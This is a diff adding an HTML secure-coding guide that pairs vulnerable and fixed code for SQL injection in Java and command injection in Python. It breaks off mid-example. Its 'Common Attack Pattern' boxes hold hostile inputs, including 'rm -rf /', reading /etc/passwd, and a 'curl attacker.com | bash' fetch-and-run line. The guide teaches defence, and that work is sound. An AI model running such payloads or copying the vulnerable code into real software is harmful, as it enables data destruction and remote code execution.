@@ -1,0 +1,1800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SmartFix Code Remediation Guide | Contrast Security</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/csharp.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            color: #e0e6ed;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 60px;
+            padding-bottom: 40px;
+            border-bottom: 2px solid rgba(102, 126, 234, 0.2);
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+        }
+
+        .subtitle {
+            font-size: 1.25rem;
+            color: #a0aec0;
+            font-weight: 400;
+        }
+
+        .guide-intro {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 50px;
+        }
+
+        .guide-intro h2 {
+            color: #667eea;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+        }
+
+        .guide-intro p {
+            color: #cbd5e0;
+            line-height: 1.8;
+            margin-bottom: 10px;
+        }
+
+        .vulnerability-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 50px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .vulnerability-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 60px rgba(102, 126, 234, 0.15);
+        }
+
+        .vuln-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .vuln-title {
+            flex: 1;
+        }
+
+        .vuln-title h2 {
+            font-size: 2rem;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .vuln-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: #a0aec0;
+            background: rgba(102, 126, 234, 0.1);
+            padding: 5px 12px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+
+        .severity-badge {
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .severity-critical {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            color: #fff;
+        }
+
+        .severity-high {
+            background: linear-gradient(135deg, #ed8936 0%, #dd6b20 100%);
+            color: #fff;
+        }
+
+        .security-violation {
+            background: rgba(229, 62, 62, 0.1);
+            border-left: 4px solid #e53e3e;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .security-violation h3 {
+            color: #fc8181;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+
+        .security-violation p {
+            color: #e0e6ed;
+            line-height: 1.7;
+        }
+
+        .code-comparison {
+            margin-bottom: 40px;
+        }
+
+        .comparison-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 15px 25px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(102, 126, 234, 0.3);
+            border-radius: 8px;
+            color: #a0aec0;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .tab-button:hover {
+            background: rgba(102, 126, 234, 0.1);
+            border-color: #667eea;
+        }
+
+        .tab-button.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-color: #667eea;
+            color: #fff;
+        }
+
+        .tab-button.before-tab.active {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            border-color: #e53e3e;
+        }
+
+        .tab-button.after-tab.active {
+            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
+            border-color: #48bb78;
+        }
+
+        .code-panel {
+            display: none;
+            position: relative;
+        }
+
+        .code-panel.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .code-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 12px 20px;
+            border-radius: 8px 8px 0 0;
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            border-bottom: none;
+        }
+
+        .code-filename {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: #667eea;
+            font-weight: 500;
+        }
+
+        .code-status {
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .status-vulnerable {
+            background: rgba(229, 62, 62, 0.2);
+            color: #fc8181;
+            border: 1px solid rgba(229, 62, 62, 0.4);
+        }
+
+        .status-secure {
+            background: rgba(72, 187, 120, 0.2);
+            color: #9ae6b4;
+            border: 1px solid rgba(72, 187, 120, 0.4);
+        }
+
+        .code-block {
+            background: #282c34;
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            overflow: hidden;
+        }
+
+        .code-block pre {
+            margin: 0;
+            padding: 25px;
+            overflow-x: auto;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .fix-explanation {
+            background: rgba(72, 187, 120, 0.05);
+            border-left: 4px solid #48bb78;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .fix-explanation h3 {
+            color: #9ae6b4;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .fix-explanation h3::before {
+            content: "✓";
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            background: rgba(72, 187, 120, 0.2);
+            border-radius: 50%;
+            font-weight: bold;
+        }
+
+        .fix-explanation p {
+            color: #cbd5e0;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .fix-explanation ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .fix-explanation li {
+            padding: 10px 0;
+            padding-left: 30px;
+            position: relative;
+            color: #cbd5e0;
+            line-height: 1.7;
+        }
+
+        .fix-explanation li::before {
+            content: "→";
+            position: absolute;
+            left: 0;
+            color: #48bb78;
+            font-weight: bold;
+        }
+
+        .owasp-section {
+            background: rgba(102, 126, 234, 0.05);
+            border: 1px solid rgba(102, 126, 234, 0.2);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .owasp-section h3 {
+            color: #667eea;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+        }
+
+        .owasp-section p {
+            color: #cbd5e0;
+            line-height: 1.8;
+            margin-bottom: 12px;
+        }
+
+        .owasp-section ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .owasp-section li {
+            padding: 8px 0;
+            padding-left: 30px;
+            position: relative;
+            color: #cbd5e0;
+            line-height: 1.7;
+        }
+
+        .owasp-section li::before {
+            content: "•";
+            position: absolute;
+            left: 10px;
+            color: #667eea;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .alternatives-section {
+            background: rgba(237, 137, 54, 0.05);
+            border-left: 4px solid #ed8936;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        .alternatives-section h3 {
+            color: #fbd38d;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+        }
+
+        .alternative-option {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(237, 137, 54, 0.2);
+        }
+
+        .alternative-option h4 {
+            color: #fbd38d;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+        }
+
+        .alternative-option p {
+            color: #cbd5e0;
+            line-height: 1.7;
+            margin-bottom: 10px;
+        }
+
+        .alternative-option code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: #fbd38d;
+        }
+
+        .config-section {
+            background: rgba(159, 122, 234, 0.05);
+            border: 1px solid rgba(159, 122, 234, 0.2);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .config-section h3 {
+            color: #b794f4;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+        }
+
+        .config-section p {
+            color: #cbd5e0;
+            line-height: 1.8;
+            margin-bottom: 12px;
+        }
+
+        .config-example {
+            background: #282c34;
+            border: 1px solid rgba(159, 122, 234, 0.2);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 15px;
+        }
+
+        .config-example pre {
+            margin: 0;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .config-example code {
+            font-family: 'JetBrains Mono', monospace;
+            color: #e0e6ed;
+        }
+
+        .highlight-line {
+            background: rgba(72, 187, 120, 0.1);
+            display: block;
+            margin: 0 -25px;
+            padding: 0 25px;
+            border-left: 3px solid #48bb78;
+        }
+
+        .warning-box {
+            background: rgba(237, 137, 54, 0.1);
+            border: 1px solid rgba(237, 137, 54, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .warning-box h4 {
+            color: #fbd38d;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .warning-box h4::before {
+            content: "⚠";
+            font-size: 1.3rem;
+        }
+
+        .warning-box p {
+            color: #cbd5e0;
+            line-height: 1.7;
+        }
+
+        .best-practice {
+            background: rgba(102, 126, 234, 0.1);
+            border-left: 4px solid #667eea;
+            padding: 15px 20px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+
+        .best-practice strong {
+            color: #667eea;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        footer {
+            text-align: center;
+            padding-top: 40px;
+            margin-top: 60px;
+            border-top: 2px solid rgba(102, 126, 234, 0.2);
+            color: #a0aec0;
+        }
+
+        footer p {
+            margin-bottom: 10px;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+        }
+
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #764ba2;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+
+            .subtitle {
+                font-size: 1rem;
+            }
+
+            .vulnerability-card {
+                padding: 25px;
+            }
+
+            .vuln-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .comparison-tabs {
+                flex-direction: column;
+            }
+
+            .code-block pre {
+                padding: 15px;
+                font-size: 0.85rem;
+            }
+        }
+
+        .inline-code {
+            background: rgba(102, 126, 234, 0.15);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+            color: #9ae6b4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SmartFix Code Remediation Guide</h1>
+            <p class="subtitle">Interactive Security Vulnerability Remediation Examples</p>
+        </header>
+
+        <div class="guide-intro">
+            <h2>About This Guide</h2>
+            <p>This comprehensive guide demonstrates secure coding practices through real-world vulnerability remediation examples. Each section includes interactive before/after code comparisons, detailed security explanations, OWASP best practices, and alternative approaches to help developers understand not just what to fix, but why and how.</p>
+            <p>The vulnerabilities covered represent some of the most critical security issues found in modern applications. Understanding these patterns and their remediation strategies is essential for building secure software.</p>
+        </div>
+
+        <!-- SQL Injection Vulnerability -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <div class="vuln-title">
+                    <h2>SQL Injection Vulnerability</h2>
+                    <span class="vuln-id">SALY-Y689-EXC0-CQLC</span>
+                </div>
+                <div class="severity-badge severity-critical">Critical</div>
+            </div>
+
+            <div class="security-violation">
+                <h3>Security Principle Violated: Input Validation and Parameterization</h3>
+                <p>This vulnerability violates the fundamental security principle of treating all user input as untrusted. By directly concatenating user input into SQL queries, the application allows attackers to manipulate the query structure, potentially leading to data breaches, data manipulation, or complete database compromise.</p>
+            </div>
+
+            <div class="code-comparison">
+                <div class="comparison-tabs">
+                    <button class="tab-button before-tab active" onclick="switchTab(event, 'sql-before')">Vulnerable Code</button>
+                    <button class="tab-button after-tab" onclick="switchTab(event, 'sql-after')">Secure Code</button>
+                </div>
+
+                <div id="sql-before" class="code-panel active">
+                    <div class="code-header">
+                        <span class="code-filename">PaymentController.java</span>
+                        <span class="code-status status-vulnerable">VULNERABLE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-java">@GetMapping("/payment/history")
+public ResponseEntity&lt;List&lt;Payment&gt;&gt; getPaymentHistory(
+        @RequestParam String userId) {
+
+    // VULNERABLE: Direct string concatenation allows SQL injection
+    String query = "SELECT * FROM payments WHERE user_id = '" + userId + "'";
+
+    try {
+        Statement statement = connection.createStatement();
+        ResultSet resultSet = statement.executeQuery(query);
+
+        List&lt;Payment&gt; payments = new ArrayList&lt;&gt;();
+        while (resultSet.next()) {
+            Payment payment = new Payment();
+            payment.setId(resultSet.getLong("id"));
+            payment.setAmount(resultSet.getBigDecimal("amount"));
+            payment.setDate(resultSet.getTimestamp("payment_date"));
+            payments.add(payment);
+        }
+
+        return ResponseEntity.ok(payments);
+    } catch (SQLException e) {
+        return ResponseEntity.status(500).build();
+    }
+}</code></pre>
+                    </div>
+                </div>
+
+                <div id="sql-after" class="code-panel">
+                    <div class="code-header">
+                        <span class="code-filename">PaymentController.java</span>
+                        <span class="code-status status-secure">SECURE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-java">@GetMapping("/payment/history")
+public ResponseEntity&lt;List&lt;Payment&gt;&gt; getPaymentHistory(
+        @RequestParam String userId) {
+
+    // SECURE: Using parameterized query with PreparedStatement
+    String query = "SELECT * FROM payments WHERE user_id = ?";
+
+    try {
+        // PreparedStatement prevents SQL injection by treating input as data
+        PreparedStatement preparedStatement = connection.prepareStatement(query);
+        preparedStatement.setString(1, userId);
+
+        ResultSet resultSet = preparedStatement.executeQuery();
+
+        List&lt;Payment&gt; payments = new ArrayList&lt;&gt;();
+        while (resultSet.next()) {
+            Payment payment = new Payment();
+            payment.setId(resultSet.getLong("id"));
+            payment.setAmount(resultSet.getBigDecimal("amount"));
+            payment.setDate(resultSet.getTimestamp("payment_date"));
+            payments.add(payment);
+        }
+
+        return ResponseEntity.ok(payments);
+    } catch (SQLException e) {
+        // Log error details securely (not exposed to user)
+        logger.error("Database error fetching payment history", e);
+        return ResponseEntity.status(500).build();
+    }
+}</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fix-explanation">
+                <h3>Why This Fix Works</h3>
+                <p>The remediated code uses <strong>PreparedStatement</strong> with parameterized queries, which is the industry-standard approach to preventing SQL injection attacks. Here's why this is secure:</p>
+                <ul>
+                    <li><strong>Parameter Binding:</strong> The <span class="inline-code">?</span> placeholder separates SQL logic from user data. The database driver automatically escapes and quotes the parameter value.</li>
+                    <li><strong>Type Safety:</strong> Using <span class="inline-code">setString()</span> ensures the parameter is treated as a string literal, not executable SQL code.</li>
+                    <li><strong>Database-Level Protection:</strong> PreparedStatements are compiled separately from the data, making it impossible for user input to alter the query structure.</li>
+                    <li><strong>Performance Benefits:</strong> Prepared statements can be cached and reused, improving performance while maintaining security.</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h4>Common Attack Pattern</h4>
+                <p>An attacker could exploit the vulnerable code by submitting: <span class="inline-code">userId = "1' OR '1'='1"</span></p>
+                <p>This would transform the query into: <span class="inline-code">SELECT * FROM payments WHERE user_id = '1' OR '1'='1'</span></p>
+                <p>The OR condition would always be true, exposing all payment records in the database regardless of user ownership.</p>
+            </div>
+
+            <div class="owasp-section">
+                <h3>OWASP Best Practices</h3>
+                <p>This remediation aligns with <strong>OWASP Top 10 - A03:2021 Injection</strong> prevention guidelines:</p>
+                <ul>
+                    <li><strong>Use Parameterized Queries:</strong> Always use prepared statements with variable binding for all database interactions.</li>
+                    <li><strong>Input Validation:</strong> Implement whitelist validation for user input when possible (e.g., validate userId format).</li>
+                    <li><strong>Least Privilege:</strong> Database accounts should have minimal permissions required for their function.</li>
+                    <li><strong>Defense in Depth:</strong> Layer multiple security controls including input validation, parameterization, and proper error handling.</li>
+                    <li><strong>Error Handling:</strong> Never expose detailed database errors to users; log them securely instead.</li>
+                </ul>
+            </div>
+
+            <div class="alternatives-section">
+                <h3>Alternative Remediation Approaches</h3>
+
+                <div class="alternative-option">
+                    <h4>1. Using JPA/Hibernate with Named Parameters</h4>
+                    <p>Object-Relational Mapping (ORM) frameworks provide built-in protection against SQL injection:</p>
+                    <div class="config-example">
+                        <pre><code class="language-java">@Query("SELECT p FROM Payment p WHERE p.userId = :userId")
+List&lt;Payment&gt; findByUserId(@Param("userId") String userId);</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Higher-level abstraction, automatic parameterization, reduced boilerplate code.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>2. Using Spring JdbcTemplate</h4>
+                    <p>Spring's JdbcTemplate provides a clean API with built-in parameterization support:</p>
+                    <div class="config-example">
+                        <pre><code class="language-java">List&lt;Payment&gt; payments = jdbcTemplate.query(
+    "SELECT * FROM payments WHERE user_id = ?",
+    new Object[]{userId},
+    new PaymentRowMapper()
+);</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Simplified JDBC usage, automatic resource management, parameterization by default.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>3. Stored Procedures with Parameters</h4>
+                    <p>Stored procedures can provide an additional security layer when properly implemented:</p>
+                    <div class="config-example">
+                        <pre><code class="language-java">CallableStatement cs = connection.prepareCall("{call getPaymentHistory(?)}");
+cs.setString(1, userId);
+ResultSet rs = cs.executeQuery();</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Database-level logic encapsulation, additional access control layer.</p>
+                    <p><strong>Note:</strong> Stored procedures must also use parameterization internally to be secure.</p>
+                </div>
+            </div>
+
+            <div class="config-section">
+                <h3>Security Control Configuration</h3>
+                <p>Beyond code changes, implement these configuration and architectural controls:</p>
+
+                <div class="best-practice">
+                    <strong>Database Connection Configuration</strong>
+                    Ensure your datasource uses secure connection properties and appropriate timeouts.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-yaml"># application.yml
+spring:
+  datasource:
+    url: jdbc:postgresql://localhost:5432/paymentdb
+    username: app_user
+    password: ${DB_PASSWORD}
+    hikari:
+      maximum-pool-size: 10
+      connection-timeout: 30000
+  jpa:
+    properties:
+      hibernate:
+        # Log parameter values in development only
+        show_sql: false
+        format_sql: false</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Input Validation Layer</strong>
+                    Add validation annotations to enforce data format expectations.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-java">@GetMapping("/payment/history")
+public ResponseEntity&lt;List&lt;Payment&gt;&gt; getPaymentHistory(
+        @RequestParam
+        @Pattern(regexp = "^[0-9]+$", message = "User ID must be numeric")
+        @NotBlank
+        String userId) {
+    // ... implementation
+}</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Database User Permissions</strong>
+                    Configure database user with minimum required privileges (principle of least privilege).
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-sql">-- Grant only necessary permissions
+GRANT SELECT ON payments TO app_user;
+GRANT SELECT ON users TO app_user;
+-- Do NOT grant DROP, ALTER, or admin privileges</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Command Injection Vulnerability -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <div class="vuln-title">
+                    <h2>Command Injection Vulnerability</h2>
+                    <span class="vuln-id">DXF8-3N0U-UGTV-R74V</span>
+                </div>
+                <div class="severity-badge severity-critical">Critical</div>
+            </div>
+
+            <div class="security-violation">
+                <h3>Security Principle Violated: Secure System Command Execution</h3>
+                <p>This vulnerability violates the principle of secure process execution by passing unsanitized user input directly to system shell commands. This allows attackers to inject arbitrary commands, potentially leading to complete system compromise, data exfiltration, or use of the server as a pivot point for further attacks.</p>
+            </div>
+
+            <div class="code-comparison">
+                <div class="comparison-tabs">
+                    <button class="tab-button before-tab active" onclick="switchTab(event, 'cmd-before')">Vulnerable Code</button>
+                    <button class="tab-button after-tab" onclick="switchTab(event, 'cmd-after')">Secure Code</button>
+                </div>
+
+                <div id="cmd-before" class="code-panel active">
+                    <div class="code-header">
+                        <span class="code-filename">app.py</span>
+                        <span class="code-status status-vulnerable">VULNERABLE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-python">@app.route('/backup', methods=['POST'])
+def create_backup():
+    filename = request.form.get('filename')
+
+    # VULNERABLE: User input directly passed to shell command
+    command = f"tar -czf /backups/{filename}.tar.gz /data"
+
+    try:
+        # Using shell=True makes command injection trivial
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if result.returncode == 0:
+            return jsonify({
+                'status': 'success',
+                'message': f'Backup created: {filename}.tar.gz'
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': 'Backup failed'
+            }), 500
+
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500</code></pre>
+                    </div>
+                </div>
+
+                <div id="cmd-after" class="code-panel">
+                    <div class="code-header">
+                        <span class="code-filename">app.py</span>
+                        <span class="code-status status-secure">SECURE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-python">import re
+import os
+from pathlib import Path
+
+@app.route('/backup', methods=['POST'])
+def create_backup():
+    filename = request.form.get('filename', '')
+
+    # SECURE: Strict input validation with whitelist approach
+    if not filename or not re.match(r'^[a-zA-Z0-9_-]+$', filename):
+        return jsonify({
+            'status': 'error',
+            'message': 'Invalid filename. Use only letters, numbers, dashes, and underscores.'
+        }), 400
+
+    # Additional length validation
+    if len(filename) > 50:
+        return jsonify({
+            'status': 'error',
+            'message': 'Filename too long. Maximum 50 characters.'
+        }), 400
+
+    # Define secure paths
+    backup_dir = Path('/backups')
+    data_dir = Path('/data')
+
+    # Ensure directories exist and are safe
+    if not backup_dir.exists() or not data_dir.exists():
+        return jsonify({
+            'status': 'error',
+            'message': 'System configuration error'
+        }), 500
+
+    # Build output path securely
+    output_file = backup_dir / f"{filename}.tar.gz"
+
+    try:
+        # SECURE: Pass command as list, shell=False prevents injection
+        result = subprocess.run(
+            [
+                'tar',
+                '-czf',
+                str(output_file),
+                str(data_dir)
+            ],
+            shell=False,  # Critical: Never use shell=True with user input
+            capture_output=True,
+            text=True,
+            timeout=300,  # Prevent DoS via long-running processes
+            check=False
+        )
+
+        if result.returncode == 0:
+            # Verify backup was created successfully
+            if output_file.exists():
+                return jsonify({
+                    'status': 'success',
+                    'message': f'Backup created successfully',
+                    'filename': f'{filename}.tar.gz'
+                })
+            else:
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Backup creation verification failed'
+                }), 500
+        else:
+            # Log detailed error for debugging (not exposed to user)
+            app.logger.error(f'Backup failed: {result.stderr}')
+            return jsonify({
+                'status': 'error',
+                'message': 'Backup operation failed'
+            }), 500
+
+    except subprocess.TimeoutExpired:
+        app.logger.error(f'Backup timeout for filename: {filename}')
+        return jsonify({
+            'status': 'error',
+            'message': 'Backup operation timed out'
+        }), 500
+    except Exception as e:
+        app.logger.error(f'Backup exception: {str(e)}')
+        return jsonify({
+            'status': 'error',
+            'message': 'An unexpected error occurred'
+        }), 500</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fix-explanation">
+                <h3>Why This Fix Works</h3>
+                <p>The secure implementation uses multiple defense layers to prevent command injection:</p>
+                <ul>
+                    <li><strong>Whitelist Validation:</strong> The regex <span class="inline-code">^[a-zA-Z0-9_-]+$</span> allows only safe characters, blocking shell metacharacters like <span class="inline-code">;</span>, <span class="inline-code">|</span>, <span class="inline-code">&</span>, <span class="inline-code">$</span>, etc.</li>
+                    <li><strong>Array-Based Command:</strong> Passing the command as a list instead of a string prevents shell interpretation of special characters.</li>
+                    <li><strong>shell=False:</strong> Disabling shell execution means the subprocess module directly executes the binary without invoking /bin/sh, eliminating shell injection vectors.</li>
+                    <li><strong>Path Validation:</strong> Using <span class="inline-code">Path</span> objects and validation ensures directory traversal attempts are blocked.</li>
+                    <li><strong>Timeout Protection:</strong> Prevents resource exhaustion attacks where malicious input could cause infinite loops or excessive processing.</li>
+                    <li><strong>Error Handling:</strong> Generic error messages to users while detailed errors are logged securely for debugging.</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h4>Common Attack Pattern</h4>
+                <p>An attacker could exploit the vulnerable code by submitting: <span class="inline-code">filename = "backup; rm -rf /; echo done"</span></p>
+                <p>This would execute multiple commands: create a backup, delete the entire filesystem, then echo "done".</p>
+                <p>Other dangerous payloads include: <span class="inline-code">$(whoami)</span>, <span class="inline-code">`cat /etc/passwd`</span>, <span class="inline-code">backup && curl attacker.com | bash</span></p>
+            </div>
+
+            <div class="owasp-section">
+                <h3>OWASP Best Practices</h3>
+                <p>This remediation follows <strong>OWASP Top 10 - A03:2021 Injection</strong> prevention for command injection:</p>
+                <ul>
+                    <li><strong>Avoid System Commands:</strong> When possible, use native programming language functions instead of shelling out.</li>
+                    <li><strong>Never Use shell=True:</strong> Always use parameterized command execution (array form) without shell invocation.</li>
+                    <li><strong>Input Validation:</strong> Implement strict whitelist validation using regular expressions that only allow known-safe characters.</li>
+                    <li><strong>Use Safe APIs:</strong> Prefer language-specific libraries (like Python's <span class="inline-code">shutil</span>) over direct command execution.</li>
+                    <li><strong>Principle of Least Privilege:</strong> Run processes with minimal required permissions; use dedicated service accounts.</li>
+                    <li><strong>Sandboxing:</strong> Consider using containers or VMs to isolate command execution environments.</li>
+                </ul>
+            </div>
+
+            <div class="alternatives-section">
+                <h3>Alternative Remediation Approaches</h3>
+
+                <div class="alternative-option">
+                    <h4>1. Use Native Python Libraries</h4>
+                    <p>Replace system commands with native Python functionality when possible:</p>
+                    <div class="config-example">
+                        <pre><code class="language-python">import shutil
+import tarfile
+
+def create_backup_safe(filename):
+    # Validate filename (same validation as before)
+    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
+        raise ValueError("Invalid filename")
+
+    output_path = f'/backups/{filename}.tar.gz'
+
+    # Use Python's tarfile module - no shell involved
+    with tarfile.open(output_path, "w:gz") as tar:
+        tar.add('/data', arcname='data')
+
+    return output_path</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> No shell invocation, better error handling, cross-platform compatibility, easier testing.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>2. Predefined Command Templates</h4>
+                    <p>Use a whitelist of allowed commands with predefined parameters:</p>
+                    <div class="config-example">
+                        <pre><code class="language-python">ALLOWED_BACKUP_OPERATIONS = {
+    'full': ['/usr/bin/tar', '-czf', '{output}', '/data'],
+    'incremental': ['/usr/bin/tar', '-czf', '{output}', '--listed-incremental', '/backups/snapshot.snar', '/data'],
+    'config': ['/usr/bin/tar', '-czf', '{output}', '/data/config']
+}
+
+def create_backup_templated(backup_type, filename):
+    # Validate inputs
+    if backup_type not in ALLOWED_BACKUP_OPERATIONS:
+        raise ValueError("Invalid backup type")
+
+    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
+        raise ValueError("Invalid filename")
+
+    # Get command template
+    command_template = ALLOWED_BACKUP_OPERATIONS[backup_type].copy()
+
+    # Replace output placeholder
+    output_path = f'/backups/{filename}.tar.gz'
+    command = [arg.format(output=output_path) if '{output}' in arg else arg
+               for arg in command_template]
+
+    # Execute with shell=False
+    result = subprocess.run(command, shell=False, capture_output=True, timeout=300)
+    return result.returncode == 0</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Supports multiple operations safely, easy to audit, centralized command management.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>3. Container-Based Isolation</h4>
+                    <p>Execute backup operations in isolated containers with restricted capabilities:</p>
+                    <div class="config-example">
+                        <pre><code class="language-python">import docker
+
+def create_backup_containerized(filename):
+    client = docker.from_env()
+
+    # Validate filename
+    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
+        raise ValueError("Invalid filename")
+
+    # Run backup in isolated container
+    container = client.containers.run(
+        'alpine:latest',
